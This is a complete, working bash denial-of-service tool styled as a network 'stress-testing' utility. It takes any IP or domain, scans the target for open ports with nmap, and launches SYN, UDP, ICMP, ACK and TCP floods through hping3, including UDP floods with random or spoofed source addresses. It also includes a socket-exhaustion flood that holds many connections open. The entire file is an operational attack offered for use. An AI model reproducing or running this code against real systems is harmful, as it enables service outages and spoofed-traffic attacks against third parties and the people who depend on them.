#!/bin/bash

syn_flood_attack() {
    echo -e "\033[1;33mPerforming SYN flood attack on $target_ip:$target_port\033[0m"
    local flood_option
    if [ "$use_flood" = true ]; then
        flood_option="--flood"
    else
        flood_option=""
    fi
    hping3 "$target_ip" -p "$target_port" --syn $flood_option -c "$num_packets" > /dev/null &
    show_loading_animation
}

udp_flood_attack() {
    echo -e "\033[1;33mPerforming UDP flood attack on $target_ip:$target_port\033[0m"
    hping3 "$target_ip" -p "$target_port" --udp -c "$num_packets" -d "$packet_size" > /dev/null &
    show_loading_animation
}

icmp_flood_attack() {
    echo -e "\033[1;33mPerforming ICMP flood attack on $target_ip\033[0m"
    hping3 "$target_ip" --icmp -c "$num_packets" > /dev/null &
    show_loading_animation
}

ack_flood_attack() {
    echo -e "\033[1;33mPerforming ACK flood attack on $target_ip:$target_port\033[0m"
    hping3 "$target_ip" -p "$target_port" --ack -c "$num_packets" > /dev/null &
    show_loading_animation
}

tcp_flood_attack() {
    echo -e "\033[1;33mPerforming TCP flood attack on $target_ip:$target_port\033[0m"
    hping3 "$target_ip" -p "$target_port" --tcp -c "$num_packets" -d "$packet_size" > /dev/null &
    show_loading_animation
}

udp_random_source_attack() {
    echo -e "\033[1;33mPerforming UDP flood attack on $target_ip:$target_port with random source ports\033[0m"
    hping3 "$target_ip" -p "$target_port" --udp --rand-source -c "$num_packets" -d "$packet_size" > /dev/null &
    show_loading_animation
}

udp_spoofed_source_attack() {
    echo -e "\033[1;33mPerforming UDP flood attack on $target_ip:$target_port with spoofed source IP\033[0m"
    hping3 "$target_ip" -p "$target_port" --udp --spoof "$spoofed_ip" -c "$num_packets" -d "$packet_size" > /dev/null &
    show_loading_animation
}

check_port() {
    local host=$1
    local port=$2
    nc -z "$host" "$port" </dev/null &>/dev/null
    return $?
}

make_socket() {
    local sock
    local result

    if check_port "$target_ip" "$target_port"; then
        echo -e "\033[0;32mConnecting to $target_ip:$target_port\033[0m" >&2
        sock=$(exec 3<>/dev/tcp/$target_ip/$target_port)
        result=$?
        if [[ $result -ne 0 ]]; then
            echo -e "\033[0;31mError: No connection could be made\033[0m" >&2
            exit 1
        fi
        echo -e "\033[0;32m[Connected -> $target_ip:$target_port]\033[0m" >&2
        echo "$sock"
    else
        echo -e "\033[0;31mError: Port $target_port is not open on $target_ip\033[0m" >&2
        exit 1
    fi
}

attack() {
    local sockets=()
    local x
    local r

    trap 'broke' PIPE
    while true; do
        for ((x=0; x < CONNECTIONS; x++)); do
            if [[ -z ${sockets[x]} ]]; then
                fd=$(make_socket)
                if [[ -n "$fd" ]]; then
                    sockets[x]=$fd
                else
                    echo -e "\033[0;31mError: Failed to create socket\033[0m" >&2
                    exit 1
                fi
            fi
            if [[ -n ${sockets[x]} ]]; then
                printf '\0' >&${sockets[x]}
                r=$?
                if [[ $r -eq -1 ]]; then
                    exec {sockets[x]}>&-
                    sockets[x]=""
                else
                    echo -e "\033[0;32m[Voly Sent]\033[0m" >&2
                fi
            else
                echo -e "\033[0;31mError: File descriptor ${sockets[x]} is not open\033[0m" >&2
            fi
        done
        echo -e "\033[0;32m[Voly Sent]\033[0m" >&2
        usleep 300000
    done
}

broke() {
    :
}

socket_flood_attack() {
    local x

    if ! check_port "$target_ip" "$target_port"; then
        echo -e "\033[0;31mError: Port $target_port is not open on $target_ip. The attack cannot be initiated.\033[0m" >&2
        return 1
    fi

    for ((x=0; x < num_packets; x++)); do
        (attack &)
        usleep 200000
    done
    read -p "Press any key to exit..." -n 1 -s
}

CONNECTIONS=8

show_loading_animation() {
    spin='-\|/'
    i=0
    while kill -0 $! 2>/dev/null; do
        i=$(( (i+1) %4 ))
        printf "\r${spin:$i:1} Attacking..."
        sleep .1
    done
    echo -e "\033[1;32mAttack completed.\033[0m"
    sleep 2.5
    menu
}

validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        local IFS='.'
        ip=($ip)
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        return $?
    else
        return 1
    fi
}

validate_port() {
    local port=$1
    if [[ $port =~ ^[0-9]+$ ]]; then
        [[ $port -ge 1 && $port -le 65535 ]]
        return $?
    else
        return 1
    fi
}

credentials() {
    clear
    echo ""
    echo -e "\033[1;32m░▒█▀▀▀█░▀█▀░█▀▀▄░█▀▀░█▀▀░█▀▀░▒█▄░▒█░█▀▀░▀█▀"
    echo -e "░░▀▀▀▄▄░░█░░█▄▄▀░█▀▀░▀▀▄░▀▀▄░▒█▒█▒█░█▀▀░░█░"
    echo -e "░▒█▄▄▄█░░▀░░▀░▀▀░▀▀▀░▀▀▀░▀▀▀░▒█░░▀█░▀▀▀░░▀░"
    echo -e "\033[0mA powerful stress-testing tool for networks\033[0m"
    echo ""
}

initialize() {
    credentials
    if [ "$(id -u)" != "0" ]; then
        echo -e "\033[1;31mThis script must be run as root. Exiting.\033[0m"
        exit 1
    fi
}

initiate() {
    credentials
    local attempts=0
    local target
    local auto_scan
    local ports=""

    while true; do
        read -p "Enter an IP address or domain name: " target
        if [[ $target =~ [a-zA-Z] ]]; then
            read -p "Do you want to scan for open ports automatically for the domain? (Y/N): " auto_scan
            if [[ $auto_scan =~ ^[Yy]$ ]]; then
                if ! command -v nmap &>/dev/null; then
                    echo -e "\033[1;31mError: nmap is not installed. Please specify the port manually.\033[0m"
                    return
                fi
                echo "Scanning for open ports automatically..."
                target_ip=$(dig +short "$target" | head -n1)
                if [ -z "$target_ip" ]; then
                    echo -e "\033[1;31mFailed to resolve website. Please enter a valid website.\033[0m"
                    (( attempts++ ))
                    if [ $attempts -eq 3 ]; then
                        clear
                        echo -e "\033[1;31mYou got it wrong thrice you think this is funny?\033[0m"
                        exit 1
                    fi
                    continue
                fi
                echo "Target IP: $target_ip"
                echo "Scanning for open ports..."
                ports=$(nmap -p- --open --min-rate=1000 -T4 "$target_ip" | grep '^[0-9]' | cut -d '/' -f 1 | head -n 5)
                if [ -z "$ports" ]; then
                    echo -e "\033[1;31mError: No open ports found on $target_ip. Please specify the port manually.\033[0m"
                    return
                fi
                echo "Open ports found: $ports"
                for port in $(echo "$ports" | tr ',' ' '); do
                    if ! nc -z "$target_ip" "$port" &>/dev/null; then
                        ports=$(echo "$ports" | sed "s/$port//")
                    fi
                done
                if [ -z "$ports" ]; then
                    echo -e "\033[1;31mError: No open ports found on $target_ip. Please specify the port manually.\033[0m"
                    return
                fi
                echo "Verified open ports: $ports"
                target_port=$ports
            else
                target_ip=$(dig +short "$target" | head -n1)
                if [ -z "$target_ip" ]; then
                    echo -e "\033[1;31mFailed to resolve website. Please enter a valid website.\033[0m"
                    (( attempts++ ))
                    if [ $attempts -eq 3 ]; then
                        clear
                        echo -e "\033[1;31mYou got it wrong thrice you think this is funny?\033[0m"
                        exit 1
                    fi
                    continue
                fi
                read -p "Enter the target port: " target_port
                if ! validate_port "$target_port"; then
                    echo -e "\033[1;31mInvalid port number. Please enter a valid port number (1-65535).\033[0m"
                    (( attempts++ ))
                    if [ $attempts -eq 3 ]; then
                        clear
                        echo -e "\033[1;31mYou got it wrong thrice you think this is funny?\033[0m"
                        exit 1
                    fi
                    continue
                fi
            fi
            break
        else
            if ! validate_ip "$target"; then
                echo -e "\033[1;31mInvalid IP address. Please enter a valid IP address.\033[0m"
                (( attempts++ ))
                if [ $attempts -eq 3 ]; then
                    clear
                    echo -e "\033[1;31mYou got it wrong thrice you think this is funny?\033[0m"
                    exit 1
                fi
                continue
            fi
            target_ip=$target

            read -p "Enter the target port: " target_port
            if ! validate_port "$target_port"; then
                echo -e "\033[1;31mInvalid port number. Please enter a valid port number (1-65535).\033[0m"
                (( attempts++ ))
                if [ $attempts -eq 3 ]; then
                    clear
                    echo -e "\033[1;31mYou got it wrong thrice you think this is funny?\033[0m"
                    exit 1
                fi
                continue
            fi
            break
        fi
    done
}

get_num_packets() {
    read -p "Enter the number of packets to send: " num_packets_input
    num_packets=$num_packets_input
}

menu(){
    credentials
    echo -e "\033[1mSelect an attack type:\033[0m"
    echo "1. SYN Flood Attack"
    echo "2. UDP Flood Attack"
    echo "3. ICMP Flood Attack"
    echo "4. ACK Flood Attack"
    echo "5. TCP Flood Attack"
    echo "6. UDP Flood Attack with Random Source Ports"
    echo "7. UDP Flood Attack with Spoofed Source IP"
    echo "8. Custom Socket Flood Attack"
    echo "9. Exit"
    echo ""
    read -p "Enter your choice: " choice
    echo ""
    case $choice in
        1) syn_flood_attack ;;
        2) udp_flood_attack ;;
        3) icmp_flood_attack ;;
        4) ack_flood_attack ;;
        5) tcp_flood_attack ;;
        6) udp_random_source_attack ;;
        7) udp_spoofed_source_attack ;;
        8) socket_flood_attack ;;
        9) exit 0 ;;
        *) echo -e "\033[1;31mInvalid choice. Exiting.\033[0m" ;;
    esac
}

initialize
initiate
get_num_packets
menu
